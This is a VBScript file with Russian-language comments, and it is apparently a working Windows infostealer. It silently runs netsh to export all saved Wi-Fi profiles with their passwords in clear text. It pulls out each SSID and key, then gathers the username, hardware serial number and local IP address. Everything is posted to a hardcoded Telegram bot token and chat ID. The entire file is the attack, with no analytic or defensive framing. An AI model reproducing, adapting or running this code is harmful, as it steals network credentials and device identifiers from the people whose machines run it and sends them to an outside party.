Dim chatID, token
chatID = "-1002284411537"
token = "7632512646:AAHeHLvZwR0clMZapyaLSPX_u9knOT3VlPI"
Set shell = CreateObject("WScript.Shell")
shell.Run "cmd.exe /c netsh wlan export profile key=clear folder=%temp%", 0, True
WScript.Sleep 500
Dim fso, wifiFile, wifiContents, file
Set fso = CreateObject("Scripting.FileSystemObject")
Dim message
message = "WiFi info:" & vbCrLf
Set folder = fso.GetFolder(fso.GetSpecialFolder(2)) ' 2 = Временная папка
For Each file In folder.Files
    If LCase(fso.GetExtensionName(file.Name)) = "xml" Then
        Set wifiFile = fso.OpenTextFile(file.Path, 1)
        wifiContents = wifiFile.ReadAll
        wifiFile.Close
        Dim ssid, keyMaterial
        ssid = Mid(file.Name, InStr(file.Name, "=") + 1, InStrRev(file.Name, ".") - InStr(file.Name, "=") - 1)
        keyMaterial = ExtractKeyMaterial(wifiContents)
        message = message & "SSID: " & ssid & " - Password: " & keyMaterial & vbCrLf
    End If
Next
Dim userName
userName = GetUserName()
Dim deviceDataCode
deviceDataCode = GetDeviceDataCode()
Dim localIPAddress
localIPAddress = GetLocalIPAddress()
message = message & vbCrLf & "Username: " & userName & vbCrLf
message = message & "Device info code: " & deviceDataCode & vbCrLf
message = message & "Local IP: " & localIPAddress
Dim http
Set http = CreateObject("MSXML2.ServerXMLHTTP.6.0")
Dim url
url = "https://api.telegram.org/bot" & token & "/sendMessage"
Dim json
json = "{""chat_id"":""" & chatID & """, ""text"":""" & Replace(message, """", "\""") & """}"
http.Open "POST", url, False
http.setRequestHeader "Content-Type", "application/json"
http.Send json
Set wifiFile = Nothing
Set fso = Nothing
Set http = Nothing
Set shell = Nothing
Function ExtractKeyMaterial(xmlContent)
    Dim startPos, endPos, keyMaterial
    startPos = InStr(xmlContent, "<keyMaterial>") + Len("<keyMaterial>")
    endPos = InStr(xmlContent, "</keyMaterial>")
    If startPos > 0 And endPos > startPos Then
        keyMaterial = Mid(xmlContent, startPos, endPos - startPos)
    Else
        keyMaterial = "N/A"
    End If
    ExtractKeyMaterial = keyMaterial
End Function
Function GetUserName()
    Dim network
    Set network = CreateObject("WScript.Network")
    GetUserName = network.UserName
End Function
Function GetDeviceDataCode()
    Dim wmi, items, item, deviceID
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set items = wmi.ExecQuery("SELECT * FROM Win32_ComputerSystemProduct")
    
    For Each item In items
        deviceID = item.IdentifyingNumber
    Next
    
    If deviceID = "" Then deviceID = "N/A"
    GetDeviceDataCode = deviceID
End Function
Function GetLocalIPAddress()
    Dim wmi, items, item, ipAddress
    Set wmi = GetObject("winmgmts:\\.\root\CIMV2")
    Set items = wmi.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
    
    For Each item In items
        If Not IsNull(item.IPAddress) Then
            ipAddress = item.IPAddress(0) ' Получить первый IP-адрес
            Exit For
        End If
    Next
    
    If ipAddress = "" Then ipAddress = "N/A"
    GetLocalIPAddress = ipAddress
End Function
